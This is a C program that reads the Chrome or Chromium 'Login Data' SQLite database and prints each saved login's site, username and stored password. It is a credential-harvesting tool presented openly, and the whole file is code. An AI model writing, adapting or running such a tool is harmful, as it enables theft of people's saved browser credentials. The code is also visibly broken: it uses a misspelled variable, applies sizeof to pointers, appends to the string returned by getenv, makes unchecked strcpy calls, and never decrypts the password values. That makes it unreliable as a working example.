#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sqlite3.h>

#ifdef _WIN32
#include <Windows.h>
#include <winbase.h>
#endif

struct DbUserEntry
{
    char url[256];
    char username[30];
    char password[128];
};

char *get_chrome_path()
{
    char *buff = (char *)malloc(256);
    char *chromePath;

#ifdef _WIN32
    chromPath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
    if (!GetEnvironmentVariable(L"LOCALAPPDATA", buff, sizeof(buff)))
    {
        printf("[!] Failed to get environment variable: LOCALAPPDATA");
        exit(-1);
    }
#else
    chromePath = "/.config/chromium/Default/Login Data";
    buff = getenv("HOME");
    if (!buff)
    {
        printf("[!] Failed to get environment variable: HOME");
        exit(-1);
    }
#endif

    strncat(buff, chromePath, sizeof(chromePath));

    return buff;
}

char *parse_cmd_line(int argc, char **argv)
{
    int opt;
    char *argbuf = (char *)malloc(256);

    while ((opt = getopt(argc, argv, "f:")) != -1)
    {
        switch (opt)
        {
        case 'f':
            realpath(optarg, argbuf);
            break;
        default:
            fprintf(stderr, "Usage: %s [-f file]\n", argv[0]);
            exit(1);
        }
    }
    return argbuf;
}

int get_row_count(sqlite3 *db)
{
    sqlite3_stmt *stmt;

    int rc;
    int rowcount;
    char query[] = "select count(*) from logins;";

    rc = sqlite3_prepare_v2(db, query, -1, &stmt, NULL);
    if (rc != SQLITE_OK)
    {
        fprintf(stderr, "Prepared statement failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }
    rc = sqlite3_step(stmt);
    if (rc != SQLITE_ROW)
    {
        fprintf(stderr, "Couldn't fetch data: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }
    rowcount = sqlite3_column_int(stmt, 0);

    return rowcount;
}

int main(int argc, char **argv)
{

    char *login_data_path;

    sqlite3 *db;
    sqlite3_stmt *res;

    // printf("argc: %d\n", argc);

    if (argc > 1)
    {
        login_data_path = parse_cmd_line(argc, argv);
    }
    else
    {
        login_data_path = get_chrome_path();
    }

    printf("Extracting passwords from: %s\n\n", login_data_path);

    int retVal = sqlite3_open(login_data_path, &db);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

    retVal = sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value FROM logins", -1, &res, 0);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Couldn't fetch data: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

    printf("Password data:\n");

    struct DbUserEntry *login_data = malloc(sizeof(struct DbUserEntry) * get_row_count(db));

    int login_data_iterator = 0;
    while (sqlite3_step(res) != SQLITE_DONE)
    {
        struct DbUserEntry login_data_entry;

        strcpy(login_data_entry.url, sqlite3_column_text(res, 0));
        strcpy(login_data_entry.username, sqlite3_column_text(res, 1));
        strcpy(login_data_entry.password, sqlite3_column_text(res, 2));

        login_data[login_data_iterator] = login_data_entry;
        login_data_iterator++;
    }

    for (int i = 0; i < login_data_iterator; i++)
    {
        char buf[255] = {0};
        printf("Password for user %s: %s\n", login_data[i].username, login_data[i].password);

        /*
        printf("Password for user %s: ", login_data[i].username);
        for (size_t j = 0; j < strlen(login_data[i].password); j++)
        {
            sprintf(buf, "%s%02x", buf, login_data[i].password[j]);
        }
        printf("%s\n", buf);
        */
    }

    sqlite3_finalize(res);
    sqlite3_close(db);

    return 0;
}